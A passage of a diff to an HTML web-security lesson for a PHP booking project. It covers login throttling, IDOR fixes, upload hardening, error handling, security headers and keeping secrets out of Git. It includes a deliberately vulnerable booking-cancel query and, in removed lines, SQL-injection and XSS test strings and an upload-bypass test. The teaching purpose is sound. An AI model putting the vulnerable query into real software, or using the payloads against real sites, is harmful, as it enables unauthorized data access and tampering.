-      <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// login.php, after password_verify() succeeded
-session_regenerate_id(true); // new id, old session file deleted
-$_SESSION['user_id'] = $user['id'];
-$_SESSION['role']    = $user['role'];
-
-// logout.php (called with POST + CSRF token)
-$_SESSION = [];
-setcookie(session_name(), '', ['expires' =&gt; time() - 3600, 'path' =&gt; '/']);
-session_destroy();
-header('Location: index.php');
-exit;
-        </pre>
-      </div>
-      <h3 class="Sub_Section_Title">Authorization on every action (IDOR)</h3>
-      <div class="Definitions">
-        <p>
-          Authentication answers "who are you?"; authorization answers "are you allowed to do <em>this</em>?". A very
-          common bug is the <strong>Insecure Direct Object Reference (IDOR)</strong>: the page
-          <code>edit_post.php?id=42</code> shows your post, but if you change the URL to <code>?id=43</code> you can
-          edit somebody else's post, because the server only checks that you are logged in. Hiding a button in the
-          interface is not a protection: the check must be done in PHP, in every service, both when the form is
-          displayed and when it is submitted.
-        </p>
-      </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// includes/auth.php
-function require_login(): int
+/** True when this e-mail, or the IP address of the visitor, failed too often in the last 15 minutes. */
+function login_blocked(string $email): bool
 {
-    if (empty($_SESSION['user_id'])) {
-        header('Location: login.php');
-        exit;
-    }
-    return (int) $_SESSION['user_id'];
+    $since = 'attempted_at &gt; NOW() - INTERVAL ' . LOGIN_WINDOW_MINUTES . ' MINUTE';
+    $by_email = db()-&gt;prepare("SELECT COUNT(*) FROM login_attempts WHERE email = ? AND $since");
+    $by_email-&gt;execute([mb_strtolower($email)]);
+    $by_ip = db()-&gt;prepare("SELECT COUNT(*) FROM login_attempts WHERE ip = ? AND $since");
+    $by_ip-&gt;execute([$_SERVER['REMOTE_ADDR']]);
+    return $by_email-&gt;fetchColumn() &gt;= LOGIN_MAX_FAILURES || $by_ip-&gt;fetchColumn() &gt;= LOGIN_MAX_FAILURES_IP;
 }
 
-function require_role(string $role): void
+/** Records a wrong password (and forgets the attempts older than one day). */
+function login_failed(string $email): void
 {
-    require_login();
-    if (($_SESSION['role'] ?? '') !== $role) {
-        http_response_code(403);
-        exit('Access denied.');
-    }
+    db()-&gt;prepare('INSERT INTO login_attempts (email, ip) VALUES (?, ?)')
+        -&gt;execute([mb_strtolower($email), $_SERVER['REMOTE_ADDR']]);
+    db()-&gt;exec('DELETE FROM login_attempts WHERE attempted_at &lt; NOW() - INTERVAL 1 DAY');
+}
+
+/** A successful login clears the failures of the account. */
+function login_succeeded(string $email): void
+{
+    db()-&gt;prepare('DELETE FROM login_attempts WHERE email = ?')-&gt;execute([mb_strtolower($email)]);
 }
         </pre>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> login.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// edit_post.php
-require __DIR__ . '/includes/session.php';
-require __DIR__ . '/includes/auth.php';
-require __DIR__ . '/includes/db.php';
-
-$userId = require_login();
-$postId = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
-
-// VULNERABLE: any logged-in user can open any post
-// $stmt = $pdo-&gt;prepare('SELECT * FROM posts WHERE id = ?');
-// $stmt-&gt;execute([$postId]);
-
-// SAFE: the post must belong to the current user
-$stmt = $pdo-&gt;prepare('SELECT * FROM posts WHERE id = ? AND user_id = ?');
-$stmt-&gt;execute([$postId, $userId]);
-$post = $stmt-&gt;fetch();
-
-if (!$post) {
-    http_response_code(404);
-    exit('Post not found.');
-}
-
-// The same condition must appear in the UPDATE / DELETE query:
-// UPDATE posts SET title = ?, body = ? WHERE id = ? AND user_id = ?
+if (!$errors &amp;&amp; login_blocked($values['email'])) {
+    // blocked: the password is not even checked, so an attacker learns nothing (Lab 9)
+    $error = 'محاولات كثيرة. أعيدوا المحاولة بعد ' . LOGIN_WINDOW_MINUTES . ' دقيقة.';
+} elseif (!$errors) {
+    $user = find_user_by_email($values['email']);
+    // the same message whether the e-mail or the password is wrong: do not tell which accounts exist
+    if ($user === null || !password_verify($values['password'], $user['password_hash'])) {
+        login_failed($values['email']);
+        $error = 'البريد الإلكتروني أو كلمة المرور غير صحيحة.';
+    } else {
         </pre>
       </div>
-      <div class="Note"><strong>Test:</strong> create two test accounts, A and B. Log in as A, copy the URL or the
-        AJAX request (DevTools &gt; Network &gt; right click &gt; "Copy as fetch") of each edit or delete action,
-        log in as B and replay it. Every one of these attempts must fail.</div>
+      <img class="Lab_Screenshot" src="SRC/IMAGES/Lab_9/Login_Blocked.png" alt="The login form after too many wrong passwords" loading="lazy" />
+      <div class="Definitions">
+        <div>
+          <ul><li>Per e-mail: an attacker cannot try thousands of passwords on the admin account.</li><li>Per IP address: one attacker cannot try one password on thousands of accounts.</li><li>When blocked, the password is not even checked: the right password gives the same answer as a wrong one.</li><li>The price: an attacker can block the account of someone else for 15 minutes. Real sites add a CAPTCHA or an e-mail to unblock it.</li></ul>
+        </div>
+      </div>
     </section>
-    <section id="File_Upload">
-      <h2 class="Section_Title">VI. File upload hardening</h2>
+    <section id="Authorization">
+      <h2 class="Section_Title">VI. Authorization on every action (IDOR)</h2>
       <div class="Definitions">
         <p>
-          If your project accepts files (profile pictures, product images, documents), an attacker may upload a file
-          named <code>shell.php</code> and then open it in the browser: Apache will execute it and the attacker
-          controls your server. Never trust the file name or the type sent by the browser
-          (<code>$_FILES['x']['type']</code>), both are chosen by the client. Instead: check the upload error and
-          the size, detect the real type from the content, generate a new random name with an extension you choose,
-          and forbid script execution in the upload folder.
+          Authentication says <em>who</em> the visitor is; authorization says what they may do <em>with this object</em>. In Lab 9 a customer can cancel a pending booking from &quot;my bookings&quot;. The id of the booking is in the form, so the customer can change it in the developer tools:
         </p>
       </div>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// upload_avatar.php (session, CSRF and login checks done before)
-$allowed = [
-    'image/jpeg' =&gt; 'jpg',
-    'image/png'  =&gt; 'png',
-    'image/webp' =&gt; 'webp',
-];
-$maxSize = 2 * 1024 * 1024; // 2 MB
-
-$file = $_FILES['avatar'] ?? null;
-if (!$file || $file['error'] !== UPLOAD_ERR_OK) {
-    exit('Upload failed.');
-}
-if ($file['size'] &gt; $maxSize) {
-    exit('File too large (2 MB maximum).');
-}
-
-$finfo = new finfo(FILEINFO_MIME_TYPE);
-$mime  = $finfo-&gt;file($file['tmp_name']); // real type, read from the file content
-if (!isset($allowed[$mime])) {
-    exit('Only JPEG, PNG and WebP images are accepted.');
-}
-
-$newName = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
-$target  = __DIR__ . '/uploads/' . $newName;
-
-if (!move_uploaded_file($file['tmp_name'], $target)) {
-    exit('Could not save the file.');
-}
-
-$stmt = $pdo-&gt;prepare('UPDATE users SET avatar = ? WHERE id = ?');
-$stmt-&gt;execute([$newName, $userId]);
+// VULNERABLE: any logged-in customer can cancel ANY booking by changing the id in the form
+$statement = db()-&gt;prepare("UPDATE bookings SET status = 'cancelled' WHERE id = ?");
+$statement-&gt;execute([$_POST['id']]);
         </pre>
       </div>
       <div class="Definitions">
         <p>
-          Then add an <code>.htaccess</code> file inside the <code>uploads/</code> folder so that, even if a script
-          gets there, Apache refuses to serve it and does not list the folder content.
+          This is an <strong>IDOR</strong> (Insecure Direct Object Reference), the most common hole in student projects. The fix: the query itself checks that the booking belongs to the user of the session (and is still pending):
         </p>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/queries.php (extract)</p>
       <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-# uploads/.htaccess
-Options -Indexes
-&lt;FilesMatch "\.(php|phtml|phar|php\d)$"&gt;
+        <pre class="prettyprint lang-php">
+/**
+ * Cancels a pending booking of one account (Lab 9). The WHERE checks the owner and the status:
+ * another id typed in the form changes nothing. Returns false when nothing was cancelled.
+ */
+function cancel_user_booking(int $booking_id, int $user_id): bool
+{
+    $statement = db()-&gt;prepare(
+        "UPDATE bookings SET status = 'cancelled' WHERE id = ? AND user_id = ? AND status = 'pending'"
+    );
+    $statement-&gt;execute([$booking_id, $user_id]);
+    return $statement-&gt;rowCount() === 1;
+}
+        </pre>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> cancel_booking.php</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-php">
+&lt;?php
+// A customer cancels one of their bookings (Lab 9).
+// The id of the booking comes from the form: the browser can send ANY id, so the owner is checked by the query.
+require __DIR__ . '/includes/functions.php';
+require __DIR__ . '/includes/queries.php';
+require __DIR__ . '/includes/auth.php';   // also checks the CSRF token of the form
+
+require_post('my_bookings.php');
+require_login();
+
+$id = filter_var($_POST['id'] ?? '', FILTER_VALIDATE_INT) ?: 0;
+if (cancel_user_booking($id, current_user()['id'])) {
+    flash('Success', 'تم إلغاء الحجز رقم ' . $id . '.');
+} else {
+    // not found, not yours, or already confirmed: the same answer, which reveals nothing
+    flash('Error', 'لا يمكن إلغاء هذا الحجز.');
+}
+redirect('my_bookings.php');
+        </pre>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> my_bookings.php (extract)</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-html">
+&lt;?php if ($booking['status'] === 'pending'): ?&gt;
+&lt;!-- Lab 9: a change, so a POST form with its CSRF token --&gt;
+&lt;form action="cancel_booking.php" method="post" class="Cancel_Form"&gt;
+    &lt;?= csrf_field() ?&gt;
+    &lt;input type="hidden" name="id" value="&lt;?= (int) $booking['id'] ?&gt;" /&gt;
+    &lt;button type="submit"&gt;&lt;i class="fa-solid fa-xmark"&gt;&lt;/i&gt; إلغاء الحجز&lt;/button&gt;
+&lt;/form&gt;
+        </pre>
+      </div>
+      <img class="Lab_Screenshot" src="SRC/IMAGES/Lab_9/Cancel_Booking.png" alt="My bookings: a cancelled booking and the cancel button of a pending one" loading="lazy" />
+      <div class="Note"><strong>Rule:</strong> for every id received (URL or form), ask: does the query check that this user may read or change this object? The admin area checks the role once for all its pages (<code>guard.php</code>, Lab 7); customer pages check the owner in each query.</div>
+    </section>
+    <section id="Uploads">
+      <h2 class="Section_Title">VII. File uploads</h2>
+      <div class="Definitions">
+        <div>
+          The upload of the photos of the trips (Lab 6) is already hardened. Check these points in your project:<table><tr><th>Check</th><th>In Syaha</th></tr><tr><td>size checked by the server</td><td><code>UPLOAD_MAX_BYTES</code> in <code>upload.php</code></td></tr><tr><td>real type read from the content</td><td><code>finfo</code> + <code>getimagesize()</code></td></tr><tr><td>random name, extension from the real type</td><td><code>bin2hex(random_bytes(16))</code></td></tr><tr><td>folder that cannot run scripts</td><td><code>uploads/trips/.htaccess</code></td></tr><tr><td>only admins can upload</td><td><code>guard.php</code></td></tr><tr><td>the form is protected against CSRF</td><td><code>csrf_field()</code> in <code>trip_form.php</code></td></tr></table>
+        </div>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> uploads/trips/.htaccess</p>
+      <div class="Code_Block">
+        <pre class="prettyprint">
+# Folder of the uploaded photos: files here must never be run as code.
+&lt;FilesMatch "\.(php|phtml|phar|php\d|pl|py|cgi|sh)$"&gt;
     Require all denied
 &lt;/FilesMatch&gt;
+
+# PHP as an Apache module (XAMPP): switch PHP off in this folder
+&lt;IfModule mod_php.c&gt;
+    php_flag engine off
+&lt;/IfModule&gt;
+
+# no list of the files when the folder itself is requested
+Options -Indexes
         </pre>
       </div>
-      <div class="Note"><strong>Tip:</strong> the <code>finfo</code> class comes from the <code>fileinfo</code>
-        extension. If you get "Class finfo not found", open <code>php.ini</code> from the XAMPP control panel
-        (Apache &gt; Config), remove the <code>;</code> in front of <code>extension=fileinfo</code> and restart
-        Apache. Also add a client-side check (<code>accept="image/*"</code>, size check in JS) for a better user
-        experience, but remember it is not a security measure.</div>
     </section>
-    <section id="Configuration">
-      <h2 class="Section_Title">VII. Errors, security headers and secrets</h2>
-      <h3 class="Sub_Section_Title">Do not display errors in production</h3>
+    <section id="Errors_Headers">
+      <h2 class="Section_Title">VIII. Errors, security headers and secrets</h2>
+      <h3 class="Sub_Section_Title">Do not display errors to visitors</h3>
       <div class="Definitions">
         <p>
-          PHP error messages and uncaught PDO exceptions reveal file paths, SQL queries and sometimes credentials.
-          They are very useful during development, but on a deployed site they must be written to a log file only,
-          and the user must see a generic message.
+          A PHP error message shows paths, SQL queries, sometimes the name of the database account: precious information for an attacker. On a server, errors go to the log, and the visitor gets a short page.
         </p>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-; php.ini on the production server
-display_errors = Off
-display_startup_errors = Off
-log_errors = On
-error_reporting = E_ALL
-        </pre>
-      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/security.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// includes/bootstrap.php - if you cannot edit php.ini on your hosting
-$isProduction = true; // read it from config.php in practice
-ini_set('display_errors', $isProduction ? '0' : '1');
-ini_set('log_errors', '1');
+// ------------------------------------------------------------------ errors
+
+// a visitor never sees a PHP error: it may show paths, SQL, or the name of the database account
+ini_set('display_errors', APP_DEBUG ? '1' : '0');
+ini_set('log_errors', '1');            // C:\xampp\php\logs\php_error_log, or the log of the server
 error_reporting(E_ALL);
 
-// Around database operations:
-try {
-    $stmt = $pdo-&gt;prepare('INSERT INTO orders (user_id, total) VALUES (?, ?)');
-    $stmt-&gt;execute([$userId, $total]);
-} catch (PDOException $ex) {
-    error_log($ex-&gt;getMessage());          // details go to the log file
-    http_response_code(500);
-    echo json_encode(['error' =&gt; 'Server error, please try again later.']);
+/** The folder of the pages seen from the current page: '' for the public pages, '../' from the admin folder. */
+function site_base(): string
+{
+    return basename(dirname($_SERVER['SCRIPT_FILENAME'])) === 'admin' ? '../' : '';
+}
+
+/** Stops the page and shows an error page (403, 500...) with the style of the website. */
+function show_error_page(int $code, string $title, string $text): never
+{
+    http_response_code($code);
+    $base = site_base();
+    require __DIR__ . '/error_page.php';
     exit;
 }
+
+// an exception that nobody caught (database down, bug...): logged with its details, a short message for the visitor
+set_exception_handler(function (Throwable $error): void {
+    error_log(get_class($error) . ': ' . $error-&gt;getMessage() . ' in ' . $error-&gt;getFile() . ':' . $error-&gt;getLine());
+    show_error_page(500, 'حدث خطأ في الخادم',
+        APP_DEBUG ? get_class($error) . ': ' . $error-&gt;getMessage()   // details on your computer only
+                  : 'نعتذر عن هذا الخطأ. أعيدوا المحاولة بعد قليل.');
+});
+        </pre>
+      </div>
+      <img class="Lab_Screenshot" src="SRC/IMAGES/Lab_9/Server_Error.png" alt="The 500 page when the database is not available" loading="lazy" />
+      <div class="Definitions">
+        <p>
+          The connection to the database no longer prints its own message: a failed connection throws an exception, and the handler above logs it and shows the error page.
+        </p>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/db.php (extract)</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-php">
+// a failed connection throws a PDOException: the handler of security.php logs its details
+// (host, account...) and shows the visitor a short error page (Lab 9)
+$pdo = new PDO($dsn, DB_USER, DB_PASS, [
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,       // errors become exceptions
+    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,  // rows as ['column' =&gt; value]
+    PDO::ATTR_EMULATE_PREPARES =&gt; false,               // real prepared statements
+]);
         </pre>
       </div>
       <h3 class="Sub_Section_Title">Security headers</h3>
       <div class="Definitions">
         <p>
-          HTTP response headers tell the browser to enable extra protections:
+          A few HTTP headers ask the browser to apply extra protections. They are sent by <code>security.php</code> for every page:
         </p>
       </div>
-      <table class="Table">
-        <tr>
-          <th>Header</th>
-          <th>Protection</th>
-        </tr>
-        <tr>
-          <td>Content-Security-Policy</td>
-          <td>Lists the sources from which scripts, styles, images, etc. may be loaded. Inline scripts are blocked,
-            which stops most XSS payloads. <code>frame-ancestors 'none'</code> forbids other sites from embedding
-            your pages in an iframe (clickjacking).</td>
-        </tr>
-        <tr>
-          <td>X-Content-Type-Options: nosniff</td>
-          <td>Stops the browser from guessing the type of a file (for example executing an uploaded text file as
-            JavaScript).</td>
-        </tr>
-        <tr>
-          <td>X-Frame-Options: DENY</td>
-          <td>Older equivalent of <code>frame-ancestors 'none'</code>, still useful for old browsers.</td>
-        </tr>
-        <tr>
-          <td>Referrer-Policy: strict-origin-when-cross-origin</td>
-          <td>Avoids leaking full URLs (with their parameters) to other websites.</td>
-        </tr>
-      </table>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/security.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// includes/headers.php - include at the top of every page, before any output
-header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; "
-    . "style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; "
-    . "img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'");
-header('X-Content-Type-Options: nosniff');
-header('X-Frame-Options: DENY');
-header('Referrer-Policy: strict-origin-when-cross-origin');
+// ------------------------------------------------------------------ HTTP security headers
+
+header_remove('X-Powered-By');                                   // do not tell which PHP version runs the site
+header("Content-Security-Policy: default-src 'self'; "
+    . "script-src 'self'; "                                         // no inline script, no script of another site
+    . "style-src 'self' https://fonts.googleapis.com https://cdnjs.cloudflare.com; "
+    . "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; "
+    . "img-src 'self' data:; "
+    . "frame-src https://www.openstreetmap.org; "                   // the map of the contact page
+    . "frame-ancestors 'none'; "                                    // no other site can show Syaha in a frame
+    . "form-action 'self'; base-uri 'self'; object-src 'none'");
+header('X-Content-Type-Options: nosniff');                        // a file is only used as its declared type
+header('X-Frame-Options: DENY');                                  // frame-ancestors, for older browsers
+header('Referrer-Policy: strict-origin-when-cross-origin');       // other sites do not see our URLs
+header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
+        </pre>
+      </div>
+      <div class="Definitions">
+        <div>
+          <table><tr><th>Header</th><th>Protects against</th></tr><tr><td><code>Content-Security-Policy</code></td><td>XSS: only the scripts, styles, fonts and frames of the listed origins are allowed; no inline script</td></tr><tr><td><code>frame-ancestors 'none'</code>, <code>X-Frame-Options</code></td><td>clickjacking: Syaha cannot be shown, invisible, in a frame of another site</td></tr><tr><td><code>X-Content-Type-Options: nosniff</code></td><td>an uploaded file used as a script because the browser guessed its type</td></tr><tr><td><code>Referrer-Policy</code></td><td>the full URL of our pages sent to other sites</td></tr><tr><td><code>Permissions-Policy</code></td><td>camera, microphone and location used by an injected script</td></tr></table>
+        </div>
+      </div>
+      <div class="Definitions">
+        <p>
+          The Content-Security-Policy forbids inline scripts, so the small script of the admin area moved to a file:
+        </p>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> admin/admin.js</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-js">
+// Admin area: ask for a confirmation before the forms that delete something.
+document.querySelectorAll("form[data-confirm]").forEach((form) =&gt; {
+  form.addEventListener("submit", (event) =&gt; {
+    if (!confirm(form.dataset.confirm)) event.preventDefault();
+  });
+});
         </pre>
       </div>
       <div class="Definitions">
         <p>
-          The same headers can be set for the whole project (including HTML, CSS and JS files) in an
-          <code>.htaccess</code> file at the root of the project (module <code>mod_headers</code>, enabled by default
-          in XAMPP):
+          Check the headers in the <em>Network</em> tab of the developer tools (click the page, then <em>Headers</em>), or with <code>curl</code>:
         </p>
       </div>
       <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-# .htaccess at the project root
-&lt;IfModule mod_headers.c&gt;
-    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
-    Header always set X-Content-Type-Options "nosniff"
-    Header always set X-Frame-Options "DENY"
-    Header always set Referrer-Policy "strict-origin-when-cross-origin"
-&lt;/IfModule&gt;
-Options -Indexes
+        <pre class="prettyprint">
+curl -I http://localhost/&lt;project folder&gt;/SRC/Labs/Lab_9/index.php
+
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src 'self'; script-src 'self'; ...
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Set-Cookie: SYAHA_SESSION=...; path=/; HttpOnly; SameSite=Lax
         </pre>
       </div>
-      <div class="Note"><strong>Warning:</strong> adapt the CSP to the CDNs your project really uses, then open every
-        page with the DevTools console open: blocked resources are reported there. With this policy,
-        <code>&lt;script&gt;...&lt;/script&gt;</code> blocks inside the HTML and attributes such as
-        <code>onclick="..."</code> stop working: move that code to external <code>.js</code> files and use
-        <code>addEventListener()</code>. Check the result with the Network tab (Response headers).</div>
+      <div class="Note"><strong>Test it:</strong> after adding a CSP, open every page with the console open: a blocked resource appears as a red &quot;Refused to load...&quot; error. Syaha loads its fonts and icons from two sites (<code>fonts.googleapis.com</code>, <code>cdnjs.cloudflare.com</code>) and shows a map from <code>openstreetmap.org</code>: they are listed in the policy.</div>
       <h3 class="Sub_Section_Title">Secrets out of the Git repository</h3>
       <div class="Definitions">
         <p>
-          Database passwords, API keys and SMTP passwords must not be committed: anyone with access to the
-          repository (or to a public fork) can read them, and they stay in the Git history forever. Put them in a
-          <code>config.php</code> file that is ignored by Git, and commit a <code>config.example.php</code> with fake
-          values so that your teammates know which keys to fill.
+          Everybody who can read the repository can read what is in it, forever (the history keeps everything). The settings of each computer are in a file that Git ignores:
         </p>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/config.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
 &lt;?php
-// config.example.php - committed. Copy it to config.php and fill in your own values.
+// Settings of the Syaha website.
+// The secrets (database password...) are NOT written here: this file is in Git, and everyone who can read the
+// repository could read them. Each computer or server has its own config.local.php, ignored by Git (Lab 9):
+//   copy config.local.example.php to config.local.php and write the settings of this computer in it.
+
+$local = is_file(__DIR__ . '/config.local.php') ? require __DIR__ . '/config.local.php' : [];
+
+// the default values are the ones of XAMPP: they only work on your own computer
+define('DB_HOST', $local['DB_HOST'] ?? '127.0.0.1');
+define('DB_PORT', $local['DB_PORT'] ?? 3306);
+define('DB_NAME', $local['DB_NAME'] ?? 'syaha');
+define('DB_USER', $local['DB_USER'] ?? 'root');
+define('DB_PASS', $local['DB_PASS'] ?? '');
+
+// true on your computer: PHP errors are shown. ALWAYS false on a server: errors go to the log only.
+define('APP_DEBUG', $local['APP_DEBUG'] ?? false);
+
+unset($local);
+        </pre>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/config.local.example.php</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-php">
+&lt;?php
+// Copy this file to config.local.php (ignored by Git) and write the settings of THIS computer or server.
+// Only the values that differ from the defaults of config.php are needed.
 return [
-    'db_host' =&gt; 'localhost',
-    'db_name' =&gt; 'your_database',
-    'db_user' =&gt; 'root',
-    'db_pass' =&gt; '',
-    'production' =&gt; false,
+    'DB_HOST' =&gt; '127.0.0.1',
+    'DB_PORT' =&gt; 3306,
+    'DB_NAME' =&gt; 'syaha',
+    'DB_USER' =&gt; 'syaha_app',          // on a server: a MySQL account for the site only, never root
+    'DB_PASS' =&gt; 'a long random password',
+    'APP_DEBUG' =&gt; true,               // your computer only: show the PHP errors
 ];
         </pre>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> .gitignore</p>
       <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-# .gitignore
-config.php
-uploads/*
-!uploads/.htaccess
+        <pre class="prettyprint">
+# the settings and secrets of each computer (Lab 9)
+includes/config.local.php
+# the logs of PHP, if you write them in the project
 *.log
         </pre>
       </div>
       <div class="Code_Block">
         <pre class="prettyprint lang-bash">
-# If config.php was already committed: stop tracking it (the local file is kept)
-git rm --cached config.php
-git add .gitignore config.example.php
-git commit -m "Move database credentials to an ignored config.php"
+# a password was committed by mistake: removing the file is NOT enough, it stays in the history
+git rm --cached includes/config.local.php      # stop tracking the file (it stays on your disk)
+echo "includes/config.local.php" &gt;&gt; .gitignore
+git commit -m "Stop tracking the local configuration"
+# then CHANGE the password: everybody who cloned the repository can still read the old one
         </pre>
       </div>
-      <div class="Note"><strong>Important:</strong> <code>git rm --cached</code> does not remove the file from the
-        previous commits. If a real password was ever pushed, consider it public and change it.</div>
-    </section>
-    <section id="Audit_Checklist">
-      <h2 class="Section_Title">VIII. Audit checklist and peer review</h2>
-      <h3 class="Sub_Section_Title">Fill the checklist for each service</h3>
       <div class="Definitions">
         <p>
-          Copy the table below into <code>SECURITY_AUDIT.md</code> once per web service. For each line, write
-          <strong>Pass</strong>, <strong>Fail</strong> or <strong>N/A</strong> (not applicable, with a reason). For
-          every <strong>Fail</strong>, open a GitHub issue, fix it on your <code>security-audit</code> branch, and
-          write the commit hash in the last column.
+          Finally, the folders that only contain included code or data are closed to browsers (with Apache, the web server of XAMPP):
         </p>
       </div>
-      <table class="Table">
-        <tr>
-          <th>#</th>
-          <th>Check</th>
-          <th>How to verify</th>
-          <th>Status</th>
-          <th>Fix (commit)</th>
-        </tr>
-        <tr>
-          <td>1</td>
-          <td>All SQL queries use prepared statements</td>
-          <td>Search the code for <code>query(</code>, <code>mysqli_query</code> and variables inside SQL strings;
-            try <code>' OR '1'='1' -- </code></td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>2</td>
-          <td>All user data is escaped in HTML output</td>
-          <td>Every <code>echo</code> / <code>&lt;?=</code> of user data uses <code>e()</code>; try
-            <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in each field</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>3</td>
-          <td>No user data in <code>innerHTML</code> / <code>.html()</code></td>
-          <td>Search the JS files; display an XSS payload through the AJAX service</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>4</td>
-          <td>Data-changing actions use POST and check a CSRF token</td>
-          <td>Remove the hidden field in DevTools and submit: the server must answer 403</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>5</td>
-          <td>Server-side validation of every parameter</td>
-          <td>Disable the JS validation (or send the request with "Copy as fetch") with empty, too long or invalid
-            values</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>6</td>
-          <td>Login required where needed</td>
-          <td>Log out and open the service URL directly</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>7</td>
-          <td>Ownership / role checked (no IDOR)</td>
-          <td>Replay the request of user A while logged in as user B; change <code>?id=</code></td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>8</td>
-          <td>Passwords hashed with <code>password_hash()</code></td>
-          <td>Look at the users table in phpMyAdmin: values start with <code>$2y$</code></td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>9</td>
-          <td>Session cookie is HttpOnly and SameSite; id regenerated at login; timeout and logout work</td>
-          <td>DevTools &gt; Application &gt; Cookies; compare <code>PHPSESSID</code> before and after login</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>10</td>
-          <td>Uploads checked (size, real type, random name, no execution)</td>
-          <td>Upload a <code>.php</code> file renamed to <code>.jpg</code>; open the uploads folder in the browser</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>11</td>
-          <td>No error details shown to the user</td>
-          <td>Stop MySQL in XAMPP with <code>display_errors</code> off and use the service</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>12</td>
-          <td>Security headers present</td>
-          <td>DevTools &gt; Network &gt; select the request &gt; Response headers</td>
-          <td></td>
-          <td></td>
-        </tr>
-        <tr>
-          <td>13</td>
-          <td>No secrets in the repository</td>
-          <td><code>git log --all -p -- config.php</code>; search GitHub for "password"</td>
-          <td></td>
-          <td></td>
-        </tr>
-      </table>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/.htaccess</p>
       <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-# Useful searches from the project root (Git Bash)
-grep -rn "mysqli_query\|-&gt;query(" --include=*.php .
-grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include=*.php .
-grep -rn "innerHTML\|\.html(\|insertAdjacentHTML" --include=*.js .
-grep -rn "md5(\|sha1(" --include=*.php .
+        <pre class="prettyprint">
+# The files of this folder are included by the pages, never opened directly (Lab 9).
+# Apache refuses every request: config.local.php, queries.php... cannot be requested with a URL.
+Require all denied
         </pre>
       </div>
-      <h3 class="Sub_Section_Title">Peer review: audit another team's project</h3>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> .htaccess</p>
+      <div class="Code_Block">
+        <pre class="prettyprint">
+# Apache settings of the Syaha website (Lab 9)
+
+# no list of files when a folder has no index.php
+Options -Indexes
+
+# the version of PHP is nobody's business
+&lt;IfModule mod_headers.c&gt;
+    Header unset X-Powered-By
+&lt;/IfModule&gt;
+        </pre>
+      </div>
+    </section>
+    <section id="Checklist">
+      <h2 class="Section_Title">IX. Audit checklist and peer review</h2>
+      <div class="Definitions">
+        <div>
